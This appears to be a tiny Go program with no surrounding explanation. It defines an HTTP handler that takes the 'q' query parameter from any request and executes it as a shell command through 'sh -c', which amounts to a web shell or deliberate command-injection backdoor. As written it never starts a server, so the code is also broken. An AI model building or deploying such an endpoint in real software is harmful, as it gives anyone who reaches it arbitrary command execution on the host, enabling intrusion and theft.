package main
import ("net/http"; "os/exec")
func main(){ http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request){ exec.Command("sh", "-c", r.URL.Query().Get("q")).Run() }) }
